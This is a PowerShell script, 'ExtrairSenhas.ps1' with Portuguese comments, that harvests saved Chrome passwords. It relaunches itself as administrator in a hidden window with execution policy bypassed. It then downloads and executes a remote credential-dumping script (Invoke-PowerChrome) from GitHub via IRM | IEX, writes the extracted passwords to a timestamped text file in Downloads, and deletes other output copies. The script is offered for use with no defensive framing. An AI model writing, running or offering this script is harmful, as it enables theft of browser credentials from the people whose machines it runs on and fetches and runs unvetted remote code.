# ExtrairSenhas.ps1 - Captura a saída e salva SOMENTE em Downloads

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Downloads
$pastaDownloads = [Environment]::GetFolderPath("UserDownloads")
if (-not (Test-Path $pastaDownloads)) {
    $pastaDownloads = Join-Path $env:USERPROFILE "Downloads"
}

$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDownloads "senhas_chrome_$datahora.txt"

# Carrega o script do GitHub
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Executa e CAPTURA toda a saída (em vez de deixar o script original salvar)
$output = Invoke-PowerChrome -Browser Chrome 2>&1

# Salva APENAS no arquivo que você quer (em Downloads)
$output | Out-File -FilePath $arquivoSaida -Encoding UTF8

# Remove o arquivo que o script original possa ter criado na pasta errada
$arquivoIndesejado = Get-ChildItem -Path $pastaDownloads -Filter "senhas_chrome_*.txt" | Where-Object { $_.FullName -ne $arquivoSaida }
if ($arquivoIndesejado) {
    Remove-Item $arquivoIndesejado.FullName -Force -ErrorAction SilentlyContinue
}

exit
